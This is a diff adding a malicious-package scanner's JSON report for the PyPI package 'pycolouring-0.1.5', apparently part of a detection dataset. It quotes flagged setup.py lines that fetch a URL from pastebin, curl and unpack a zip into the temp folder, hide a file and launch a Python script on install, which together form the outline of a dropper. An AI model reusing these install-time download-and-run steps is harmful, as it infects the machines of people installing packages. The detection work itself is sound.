@@ -1,0 +1,45 @@
+{
+    "issues": 5,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": {},
+        "code-execution": [
+            {
+                "location": "pycolouring/setup.py:63",
+                "code": "        os.system(f\"attrib +h {file_path}\" )\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "pycolouring/setup.py:71",
+                "code": "\tp = subprocess.Popen(f\"python {path}\",shell=True,stdin=None,stdout=subprocess.PIPE,stderr=subprocess.PIPE,close_fds=True)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "pycolouring/setup.py:98",
+                "code": "\tos.system(f\"curl -o %temp%/nice.zip -silent  {cdn}\")\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            },
+            {
+                "location": "pycolouring/setup.py:99",
+                "code": "\tos.system(f'tar -xf \"\"%temp%/nice.zip\"\" -C \"\"{filepath}\"\"')\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "download-executable": {},
+        "shady-links": [
+            {
+                "location": "pycolouring/setup.py:44",
+                "code": "\t\tcdndata = requests.get(f\"https://pastebin.com/raw/tCPxwCgS\")\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/pycolouring-0.1.5"
+}
